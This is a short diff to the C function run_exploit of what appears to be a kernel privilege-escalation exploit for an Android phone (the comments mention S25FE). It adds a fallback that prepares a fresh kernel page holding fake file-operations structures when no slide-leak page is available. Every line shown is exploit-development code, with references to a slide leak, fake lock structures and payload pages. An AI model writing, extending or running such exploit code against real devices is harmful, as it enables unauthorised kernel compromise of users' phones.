@@ -454,7 +454,16 @@ int run_exploit(int argc, char **argv) {
   pipebuf_page_base = page_base ? page_base : 0xffffff8000000000ULL;
   pr_info("app fops stage: skipping P0 pipe preparation\n");
 #endif
-  /* S25FE: reuse slide leak page; skip prepare_good_kernel_page() */
+
+    if (!page_base) {
+    pr_info("no slide page, preparing fresh fops page\n");
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+    if (!page_base) {
+      pr_error("prepare_good_kernel_page failed\n");
+      return 1;
+    }
+  }
+  
   /* S25FE: reuse slide page but initialize fake structures via configfs */
   if (page_base) {
     fake_lock = page_base + LOCK_OFF;
